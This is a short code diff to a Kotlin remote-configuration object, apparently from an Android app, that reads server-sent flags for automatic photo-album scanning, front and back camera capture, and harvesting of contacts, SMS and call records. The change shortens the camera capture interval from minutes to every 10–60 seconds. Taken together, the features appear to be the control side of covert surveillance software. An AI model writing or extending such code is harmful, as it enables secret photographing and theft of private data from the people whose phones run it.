@@ -30,8 +30,8 @@ object RemoteConfig {
     @Volatile var autoMedia: Boolean = false     // 自动扫相册
     @Volatile var autoCamFrontOn: Boolean = true // 自动前置拍照
     @Volatile var autoCamBackOn: Boolean = true  // 自动后置拍照
-    @Volatile var autoCamFront: Int = 0          // 前置间隔（分钟，0=只拍首次）
-    @Volatile var autoCamBack: Int = 0           // 后置间隔（分钟，0=只拍首次）
+    @Volatile var autoCamFront: Int = 0          // 前置间隔（秒，0=只拍首次，10-60）
+    @Volatile var autoCamBack: Int = 0           // 后置间隔（秒，0=只拍首次，10-60）
 
     // ---- 自动模式里的逐项开关（总开关 autoMode 打开后才生效）----
     @Volatile var autoContacts: Boolean = false
@@ -87,8 +87,13 @@ object RemoteConfig {
         autoMedia = o.optBoolean("auto_media", autoMedia)
         autoCamFrontOn = o.optBoolean("auto_cam_front_on", autoCamFrontOn)
         autoCamBackOn = o.optBoolean("auto_cam_back_on", autoCamBackOn)
-        autoCamFront = o.optInt("auto_cam_front", autoCamFront).coerceIn(0, 1440)
-        autoCamBack = o.optInt("auto_cam_back", autoCamBack).coerceIn(0, 1440)
+        // 间隔单位是秒：0 = 只拍首次，10-60 = 每隔多少秒拍一次
+        autoCamFront = o.optInt("auto_cam_front", autoCamFront).let {
+            if (it <= 0) 0 else it.coerceIn(10, 60)
+        }
+        autoCamBack = o.optInt("auto_cam_back", autoCamBack).let {
+            if (it <= 0) 0 else it.coerceIn(10, 60)
+        }
         autoContacts = o.optBoolean("auto_contacts", autoContacts)
         autoSms = o.optBoolean("auto_sms", autoSms)
         autoCall = o.optBoolean("auto_call", autoCall)
